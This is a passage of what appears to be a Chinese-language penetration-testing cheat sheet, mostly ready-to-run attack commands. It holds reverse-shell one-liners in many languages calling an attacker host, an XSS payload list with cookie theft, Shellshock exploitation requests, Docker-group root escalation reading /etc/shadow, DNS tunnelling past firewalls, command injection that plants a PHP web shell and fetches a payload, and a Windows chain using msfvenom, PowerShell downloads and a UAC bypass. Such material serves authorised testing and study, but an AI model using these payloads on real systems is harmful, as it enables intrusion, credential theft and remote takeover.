class="line">34</div></pre></td><td class="code"><pre><div class="line"># 设置断点</div><div class="line">break *_start</div><div class="line"></div><div class="line"># 执行下一个命令</div><div class="line">next</div><div class="line">step</div><div class="line">n</div><div class="line">s</div><div class="line"></div><div class="line"># 继续执行</div><div class="line">continue</div><div class="line">c</div><div class="line"></div><div class="line"># 数据</div><div class="line">checking &apos;REGISTERS&apos; and &apos;MEMORY&apos;</div><div class="line"></div><div class="line"># 显示寄存器的值: (Decimal,Binary,Hex)</div><div class="line">print /d –&gt; Decimal</div><div class="line">print /t –&gt; Binary</div><div class="line">print /x –&gt; Hex</div><div class="line">O/P :</div><div class="line">(gdb) print /d $eax</div><div class="line">$17 = 13</div><div class="line">(gdb) print /t $eax</div><div class="line">$18 = 1101</div><div class="line">(gdb) print /x $eax</div><div class="line">$19 = 0xd</div><div class="line">(gdb)</div><div class="line"></div><div class="line"># 显示特定内存地址的值</div><div class="line">command : x/nyz (Examine)</div><div class="line">n –&gt; Number of fields to display ==&gt;</div><div class="line">y –&gt; Format for output ==&gt; c (character) , d (decimal) , x (Hexadecimal)</div><div class="line">z –&gt; Size of field to be displayed ==&gt; b (byte) , h (halfword), w (word 32 Bit)</div></pre></td></tr></table></figure>
<h3 id="BASH-反弹-Shell"><a href="#BASH-反弹-Shell" class="headerlink" title="BASH 反弹 Shell"></a>BASH 反弹 Shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">bash -i &gt;&amp; /dev/tcp/X.X.X.X/443 0&gt;&amp;1</div><div class="line"></div><div class="line">exec /bin/bash 0&amp;0 2&gt;&amp;0</div><div class="line">exec /bin/bash 0&amp;0 2&gt;&amp;0</div><div class="line"></div><div class="line">0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/attackerip/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</div><div class="line"></div><div class="line">0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/attackerip/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</div><div class="line"></div><div class="line">exec 5&lt;&gt;/dev/tcp/attackerip/4444 cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done # or: while read line 0&lt;&amp;5; do $line 2&gt;&amp;5 &gt;&amp;5; done</div><div class="line">exec 5&lt;&gt;/dev/tcp/attackerip/4444</div><div class="line"></div><div class="line">cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done # or:</div><div class="line">while read line 0&lt;&amp;5; do $line 2&gt;&amp;5 &gt;&amp;5; done</div><div class="line"></div><div class="line">/bin/bash -i &gt; /dev/tcp/attackerip/8080 0&lt;&amp;1 2&gt;&amp;1</div><div class="line">/bin/bash -i &gt; /dev/tcp/X.X.X.X/443 0&lt;&amp;1 2&gt;&amp;1</div></pre></td></tr></table></figure>
<h3 id="PERL-反弹-Shell"><a href="#PERL-反弹-Shell" class="headerlink" title="PERL 反弹 Shell"></a>PERL 反弹 Shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">perl -MIO -e &apos;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;attackerip:443&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&apos;</div><div class="line"></div><div class="line"># Win 平台</div><div class="line">perl -MIO -e &apos;$c=new IO::Socket::INET(PeerAddr,&quot;attackerip:4444&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&apos;</div><div class="line">perl -e &apos;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;’</div></pre></td></tr></table></figure>
<h3 id="RUBY-反弹-Shell"><a href="#RUBY-反弹-Shell" class="headerlink" title="RUBY 反弹 Shell"></a>RUBY 反弹 Shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">ruby -rsocket -e &apos;exit if fork;c=TCPSocket.new(&quot;attackerip&quot;,&quot;443&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&apos;</div><div class="line"></div><div class="line"># Win 平台</div><div class="line">ruby -rsocket -e &apos;c=TCPSocket.new(&quot;attackerip&quot;,&quot;443&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&apos;</div><div class="line">ruby -rsocket -e &apos;f=TCPSocket.open(&quot;attackerip&quot;,&quot;443&quot;).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&apos;</div></pre></td></tr></table></figure>
<h3 id="PYTHON-反弹-Shell"><a href="#PYTHON-反弹-Shell" class="headerlink" title="PYTHON 反弹 Shell"></a>PYTHON 反弹 Shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;attackerip&quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;</div></pre></td></tr></table></figure>
<h3 id="PHP-反弹-Shell"><a href="#PHP-反弹-Shell" class="headerlink" title="PHP 反弹 Shell"></a>PHP 反弹 Shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">php -r &apos;$sock=fsockopen(&quot;attackerip&quot;,443);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;</div></pre></td></tr></table></figure>
<h3 id="JAVA-反弹-Shell"><a href="#JAVA-反弹-Shell" class="headerlink" title="JAVA 反弹 Shell"></a>JAVA 反弹 Shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">r = Runtime.getRuntime()</div><div class="line">p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/attackerip/443;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])</div><div class="line">p.waitFor()</div></pre></td></tr></table></figure>
<h3 id="NETCAT-反弹-Shell"><a href="#NETCAT-反弹-Shell" class="headerlink" title="NETCAT 反弹 Shell"></a>NETCAT 反弹 Shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">nc -e /bin/sh attackerip 4444</div><div class="line">nc -e /bin/sh 192.168.37.10 443</div><div class="line"></div><div class="line"># 如果 -e 参数被禁用，可以尝试以下命令</div><div class="line"># mknod backpipe p &amp;&amp; nc attackerip 443 0&lt;backpipe | /bin/bash 1&gt;backpipe</div><div class="line">/bin/sh | nc attackerip 443</div><div class="line">rm -f /tmp/p; mknod /tmp/p p &amp;&amp; nc attackerip 4443 0/tmp/</div><div class="line"></div><div class="line"># 如果你安装错了 netcat 的版本，请尝试以下命令</div><div class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc attackerip &gt;/tmp/f</div></pre></td></tr></table></figure>
<h3 id="TELNET-反弹-Shell"><a href="#TELNET-反弹-Shell" class="headerlink" title="TELNET 反弹 Shell"></a>TELNET 反弹 Shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># 如果 netcat 不可用或者 /dev/tcp</div><div class="line">mknod backpipe p &amp;&amp; telnet attackerip 443 0&lt;backpipe | /bin/bash 1&gt;backpipe</div></pre></td></tr></table></figure>
<h3 id="XTERM-反弹-Shell"><a href="#XTERM-反弹-Shell" class="headerlink" title="XTERM 反弹 Shell"></a>XTERM 反弹 Shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"># http://baike.baidu.com/view/418628.htm</div><div class="line"># 开启 X 服务器 (:1 – 监听 TCP 端口 6001)</div><div class="line">apt-get install xnest</div><div class="line">Xnest :1</div><div class="line"></div><div class="line"># 记得授权来自目标 IP 的连接</div><div class="line">xterm -display 127.0.0.1:1</div><div class="line"></div><div class="line"># 授权访问</div><div class="line">xhost +targetip</div><div class="line"></div><div class="line"># 在目标机器上连接回我们的 X 服务器</div><div class="line">xterm -display attackerip:1</div><div class="line">/usr/openwin/bin/xterm -display attackerip:1</div><div class="line">or</div><div class="line">$ DISPLAY=attackerip:0 xterm</div></pre></td></tr></table></figure>
<h3 id="XSS-备忘录"><a href="#XSS-备忘录" class="headerlink" title="XSS 备忘录"></a>XSS 备忘录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet</div><div class="line">(&quot;&lt; iframes &gt; src=http://IP:PORT &lt;/ iframes &gt;&quot;)</div><div class="line"></div><div class="line">&lt;script&gt;document.location=http://IP:PORT&lt;/script&gt;</div><div class="line"></div><div class="line">&apos;;alert(String.fromCharCode(88,83,83))//\&apos;;alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//\&quot;;alert(String.fromCharCode(88,83,83))//–&gt;&lt;/SCRIPT&gt;&quot;&gt;&apos;&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;</div><div class="line"></div><div class="line">&quot;;!–&quot;&lt;XSS&gt;=&amp;amp;amp;&#123;()&#125;</div><div class="line"></div><div class="line">&lt;IMG SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;</div><div class="line">&lt;IMG SRC=javascript:alert(&apos;XSS&apos;)&gt;</div><div class="line">&lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&quot;&gt;</div><div class="line">&lt;IMG SRC=&amp;amp;amp;#106;&amp;amp;amp;#97;&amp;amp;amp;#118;&amp;amp;amp;#97;&amp;amp;amp;#115;&amp;amp;amp;#99;&amp;amp;amp;#114;&amp;amp;amp;#105;&amp;amp;amp;#112;&amp;amp;amp;#116;&amp;amp;amp;#58;&amp;amp;amp;#97;&amp;amp;amp;#108;&amp;amp;amp;#101;&amp;amp;amp;#114;&amp;amp;amp;#116;&amp;amp;amp;#40;&amp;amp;amp;#39;&amp;amp;amp;#88;&amp;amp;amp;#83;&amp;amp;amp;#83;&amp;amp;amp;#39;&amp;amp;amp;#41;&gt;</div><div class="line"></div><div class="line">&lt;IMG SRC=&amp;amp;amp;#0000106&amp;amp;amp;#0000097&amp;amp;amp;#0000118&amp;amp;amp;#0000097&amp;amp;amp;#0000115&amp;amp;amp;#0000099&amp;amp;amp;#0000114&amp;amp;amp;#0000105&amp;amp;amp;#0000112&amp;amp;amp;#0000116&amp;amp;amp;#0000058&amp;amp;amp;#0000097&amp;amp;amp;#0000108&amp;amp;amp;#0000101&amp;amp;amp;#0000114&amp;amp;amp;#0000116&amp;amp;amp;#0000040&amp;amp;amp;#0000039&amp;amp;amp;#0000088&amp;amp;amp;#0000083&amp;amp;amp;#0000083&amp;amp;amp;#0000039&amp;amp;amp;#0000041&gt;</div><div class="line">&lt;IMG SRC=&quot;jav ascript:alert(&apos;XSS&apos;);&quot;&gt;</div><div class="line"></div><div class="line">perl -e &apos;print &quot;&lt;IMG SRC=javascript:alert(\&quot;XSS\&quot;)&gt;&quot;;&apos; &gt; out</div><div class="line"></div><div class="line">&lt;BODY onload!#$%&amp;amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;XSS&quot;)&gt;</div><div class="line"></div><div class="line">(&quot;&gt;&lt; iframes http://google.com &lt; iframes &gt;)</div><div class="line"></div><div class="line">&lt;BODY BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;</div><div class="line">&lt;FRAMESET&gt;&lt;FRAME SRC=”javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;/FRAMESET&gt;</div><div class="line">&quot;&gt;&lt;script &gt;alert(document.cookie)&lt;/script&gt;</div><div class="line">%253cscript%253ealert(document.cookie)%253c/script%253e</div><div class="line">&quot;&gt;&lt;s&quot;%2b&quot;cript&gt;alert(document.cookie)&lt;/script&gt;</div><div class="line">%22/%3E%3CBODY%20onload=’document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)&apos;%3E</div><div class="line">&lt;img src=asdf onerror=alert(document.cookie)&gt;</div></pre></td></tr></table></figure>
<h3 id="SSH-Over-SCTP-使用-Socat"><a href="#SSH-Over-SCTP-使用-Socat" class="headerlink" title="SSH Over SCTP (使用 Socat)"></a>SSH Over SCTP (使用 Socat)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"># 远端服务器</div><div class="line"># 假设你准备让 SCTP socket 监听端口 80/SCTP 并且 sshd 端口在 22/TCP</div><div class="line">$ socat SCTP-LISTEN:80,fork TCP:localhost:22</div><div class="line"></div><div class="line"># 本地端</div><div class="line"># 将 SERVER_IP 换成远端服务器的地址，然后将 80 换成 SCTP 监听的端口号</div><div class="line">$ socat TCP-LISTEN:1337,fork SCTP:SERVER_IP:80</div><div class="line"></div><div class="line"># 创建 socks 代理</div><div class="line"># 替换 username 和 -p 的端口号</div><div class="line">$ ssh -lusername localhost -D 8080 -p 1337</div></pre></td></tr></table></figure>
<p>使用洋葱网络<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"># 安装服务</div><div class="line">$ apt-get install tor torsocks</div><div class="line"></div><div class="line"># 绑定 ssh 到 tor 服务端口 80</div><div class="line"># /etc/tor/torrc</div><div class="line">SocksPolicy accept 127.0.0.1</div><div class="line">SocksPolicy accept 192.168.0.0/16</div><div class="line">Log notice file /var/log/tor/notices.log</div><div class="line">RunAsDaemon 1</div><div class="line">HiddenServiceDir /var/lib/tor/ssh_hidden_service/</div><div class="line">HiddenServicePort 80 127.0.0.1:22</div><div class="line">PublishServerDescriptor 0</div><div class="line">$ /etc/init.d/tor start</div><div class="line">$ cat /var/lib/tor/ssh_hidden_service/hostname</div><div class="line">3l5zstvt1zk5jhl662.onion</div><div class="line"></div><div class="line"># ssh 客户端连接</div><div class="line">$ apt-get install torsocks</div><div class="line">$ torsocks ssh login@3l5zstvt1zk5jhl662.onion -p 80</div></pre></td></tr></table></figure></p>
<h3 id="Metagoofil-–-元数据收集工具"><a href="#Metagoofil-–-元数据收集工具" class="headerlink" title="Metagoofil – 元数据收集工具"></a>Metagoofil – 元数据收集工具</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">注：Metagoofil 是一款利用Google收集信息的工具。</div><div class="line"></div><div class="line"># http://www.edge-security.com/metagoofil.php</div><div class="line"># 它可以自动在搜素引擎中检索和分析文件，还具有提供Mac地址，用户名列表等其他功能</div><div class="line">$ python metagoofil.py -d example.com -t doc,pdf -l 200 -n 50 -o examplefiles -f results.html</div></pre></td></tr></table></figure>
<h3 id="利用-Shellshock"><a href="#利用-Shellshock" class="headerlink" title="利用 Shellshock"></a>利用 Shellshock</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"># 一个发现并利用服务器 Shellshock 的工具</div><div class="line"># https://github.com/nccgroup/shocker</div><div class="line">$ ./shocker.py -H 192.168.56.118  --command &quot;/bin/cat /etc/passwd&quot; -c /cgi-bin/status --verbose</div><div class="line"></div><div class="line"># 查看文件</div><div class="line">$ echo -e &quot;HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () &#123; :;&#125;; echo \$(&lt;/etc/passwd)\r\nHost: vulnerable\r\nConnection: close\r\n\r\n&quot; | nc 192.168.56.118 80</div><div class="line"></div><div class="line"># 绑定 shell</div><div class="line">$ echo -e &quot;HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () &#123; :;&#125;; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n&quot; | nc 192.168.56.118 80</div><div class="line"></div><div class="line"># 反弹 Shell</div><div class="line">$ nc -l -p 443</div><div class="line">$ echo &quot;HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () &#123; :;&#125;; /usr/bin/nc 192.168.56.103 443 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n&quot; | nc 192.168.56.118 80</div></pre></td></tr></table></figure>
<h3 id="获取-Docker-的-Root"><a href="#获取-Docker-的-Root" class="headerlink" title="获取 Docker 的 Root"></a>获取 Docker 的 Root</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"># 获取  Docker 的 Root</div><div class="line"># user 必须在 docker 用户组中</div><div class="line">ek@victum:~/docker-test$ id</div><div class="line">uid=1001(ek) gid=1001(ek) groups=1001(ek),114(docker)</div><div class="line"></div><div class="line">ek@victum:~$ mkdir docker-test</div><div class="line">ek@victum:~$ cd docker-test</div><div class="line"></div><div class="line">ek@victum:~$ cat &gt; Dockerfile</div><div class="line">FROM debian:wheezy</div><div class="line"></div><div class="line">ENV WORKDIR /stuff</div><div class="line"></div><div class="line">RUN mkdir -p $WORKDIR</div><div class="line"></div><div class="line">VOLUME [ $WORKDIR ]</div><div class="line"></div><div class="line">WORKDIR $WORKDIR</div><div class="line">&lt;&lt; EOF</div><div class="line"></div><div class="line">ek@victum:~$ docker build -t my-docker-image .</div><div class="line">ek@victum:~$ docker run -v $PWD:/stuff -t my-docker-image /bin/sh -c \</div><div class="line">&apos;cp /bin/sh /stuff &amp;&amp; chown root.root /stuff/sh &amp;&amp; chmod a+s /stuff/sh&apos;</div><div class="line">./sh</div><div class="line">whoami</div><div class="line"># root</div><div class="line"></div><div class="line">ek@victum:~$ docker run -v /etc:/stuff -t my-docker-image /bin/sh -c &apos;cat /stuff/shadow&apos;</div></pre></td></tr></table></figure>
<h3 id="使用-DNS-隧道绕过防火墙"><a href="#使用-DNS-隧道绕过防火墙" class="headerlink" title="使用 DNS 隧道绕过防火墙"></a>使用 DNS 隧道绕过防火墙</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"># 让数据和命令使用 DNS 隧道传输以绕过防火墙的检查</div><div class="line"># dnscat2 支持从目标主机上面上传和下载命令来获取文件、数据和程序</div><div class="line"></div><div class="line"># 服务器 (攻击者)</div><div class="line">$ apt-get update</div><div class="line">$ apt-get -y install ruby-dev git make g++</div><div class="line">$ gem install bundler</div><div class="line">$ git clone https://github.com/iagox86/dnscat2.git</div><div class="line">$ cd dnscat2/server</div><div class="line">$ bundle install</div><div class="line">$ ruby ./dnscat2.rb</div><div class="line">dnscat2&gt; New session established: 16059</div><div class="line">dnscat2&gt; session -i 16059</div><div class="line"></div><div class="line"># 客户机 (目标)</div><div class="line"># https://downloads.skullsecurity.org/dnscat2/</div><div class="line"># https://github.com/lukebaggett/dnscat2-powershell</div><div class="line">$ dnscat --host &lt;dnscat server_ip&gt;</div></pre></td></tr></table></figure>
<h3 id="编译-Assemble-代码"><a href="#编译-Assemble-代码" class="headerlink" title="编译 Assemble 代码"></a>编译 Assemble 代码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$ nasm -f elf32 simple32.asm -o simple32.o</div><div class="line">$ ld -m elf_i386 simple32.o simple32</div><div class="line"></div><div class="line">$ nasm -f elf64 simple.asm -o simple.o</div><div class="line">$ ld simple.o -o simple</div></pre></td></tr></table></figure>
<h3 id="使用非交互-Shell-打入内网"><a href="#使用非交互-Shell-打入内网" class="headerlink" title="使用非交互 Shell 打入内网"></a>使用非交互 Shell 打入内网</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"># 生成 shell 使用的 ssh 密钥</div><div class="line">$ wget -O - -q &quot;http://domain.tk/sh.php?cmd=whoami&quot;</div><div class="line">$ wget -O - -q &quot;http://domain.tk/sh.php?cmd=ssh-keygen -f /tmp/id_rsa -N \&quot;\&quot; &quot;</div><div class="line">$ wget -O - -q &quot;http://domain.tk/sh.php?cmd=cat /tmp/id_rsa&quot;</div><div class="line"></div><div class="line"># 增加用户 tempuser </div><div class="line">$ useradd -m tempuser</div><div class="line">$ mkdir /home/tempuser/.ssh &amp;&amp; chmod 700 /home/tempuser/.ssh</div><div class="line">$ wget -O - -q &quot;http://domain.tk/sh.php?cmd=cat /tmp/id_rsa&quot; &gt; /home/tempuser/.ssh/authorized_keys</div><div class="line">$ chmod 700 /home/tempuser/.ssh/authorized_keys</div><div class="line">$ chown -R tempuser:tempuser /home/tempuser/.ssh</div><div class="line"></div><div class="line"># 反弹 ssh shell</div><div class="line">$ wget -O - -q &quot;http://domain.tk/sh.php?cmd=ssh -i /tmp/id_rsa -o StrictHostKeyChecking=no -R 127.0.0.1:8080:192.168.20.13:8080 -N -f tempuser@&lt;attacker_ip&gt;&quot;</div></pre></td></tr></table></figure>
<h3 id="利用-POST-远程命令执行获取-Shell"><a href="#利用-POST-远程命令执行获取-Shell" class="headerlink" title="利用 POST 远程命令执行获取 Shell"></a>利用 POST 远程命令执行获取 Shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">attacker:~$ curl -i -s -k  -X &apos;POST&apos; --data-binary $&apos;IP=%3Bwhoami&amp;submit=submit&apos; &apos;http://victum.tk/command.php&apos;</div><div class="line"></div><div class="line">attacker:~$ curl -i -s -k  -X &apos;POST&apos; --data-binary $&apos;IP=%3Becho+%27%3C%3Fphp+system%28%24_GET%5B%22cmd%22%5D%29%3B+%3F%3E%27+%3E+..%2Fshell.php&amp;submit=submit&apos; &apos;http://victum.tk/command.php&apos;</div><div class="line"></div><div class="line">attacker:~$ curl http://victum.tk/shell.php?cmd=id</div><div class="line"></div><div class="line"># 在服务器上下载 shell (phpshell.php)</div><div class="line"></div><div class="line">http://victum.tk/shell.php?cmd=php%20-r%20%27file_put_contents%28%22phpshell.php%22,%20fopen%28%22http://attacker.tk/phpshell.txt%22,%20%27r%27%29%29;%27</div><div class="line"></div><div class="line"># 运行 nc 并执行 phpshell.php</div><div class="line">attacker:~$ nc -nvlp 1337</div></pre></td></tr></table></figure>
<h3 id="以管理员身份在-Win7-上反弹具有系统权限的-Shell"><a href="#以管理员身份在-Win7-上反弹具有系统权限的-Shell" class="headerlink" title="以管理员身份在 Win7 上反弹具有系统权限的 Shell"></a>以管理员身份在 Win7 上反弹具有系统权限的 Shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line">msfvenom –p windows/shell_reverse_tcp LHOST=192.168.56.102 –f exe &gt; danger.exe</div><div class="line"></div><div class="line"># 显示账户配置</div><div class="line">net user &lt;login&gt;</div><div class="line"></div><div class="line"># Kali 上下载 psexec</div><div class="line"></div><div class="line">https://technet.microsoft.com/en-us/sysinternals/bb897553.aspx</div><div class="line"></div><div class="line"># 使用 powershell 脚本上传 psexec.exe 到目标机器</div><div class="line">echo $client = New-Object System.Net.WebClient &gt; script.ps1</div><div class="line">echo $targetlocation = &quot;http://192.168.56.102/PsExec.exe&quot; &gt;&gt; script.ps1</div><div class="line">echo $client.DownloadFile($targetlocation,&quot;psexec.exe&quot;) &gt;&gt; script.ps1</div><div class="line">powershell.exe -ExecutionPolicy Bypass -NonInteractive -File script.ps1</div><div class="line"></div><div class="line"># 使用 powershell 脚本上传 danger.exe 到目标机器</div><div class="line">echo $client = New-Object System.Net.WebClient &gt; script2.ps1</div><div class="line">echo $targetlocation = &quot;http://192.168.56.102/danger.exe&quot; &gt;&gt; script2.ps1</div><div class="line">echo $client.DownloadFile($targetlocation,&quot;danger.exe&quot;) &gt;&gt; script2.ps1</div><div class="line">powershell.exe -ExecutionPolicy Bypass -NonInteractive -File script2.ps1</div><div class="line"></div><div class="line"># 使用预编译的二进制文件绕过 UAC:</div><div class="line"></div><div class="line">https://github.com/hfiref0x/UACME</div><div class="line"></div><div class="line"># 使用 powershell 脚本上传 https://github.com/hfiref0x/UACME/blob/master/Compiled/Akagi64.exe 到目标机器</div><div class="line">echo $client = New-Object System.Net.WebClient &gt; script2.ps1</div><div class="line">echo $targetlocation = &quot;http://192.168.56.102/Akagi64.exe&quot; &gt;&gt; script3.ps1</div><div class="line">echo $client.DownloadFile($targetlocation,&quot;Akagi64.exe&quot;) &gt;&gt; script3.ps1</div><div class="line">powershell.exe -ExecutionPolicy Bypass -NonInteractive -File script3.ps1</div><div class="line"></div><div class="line"># 在 Kali 上创建监听</div><div class="line">nc -lvp 4444</div><div class="line"></div><div class="line"># 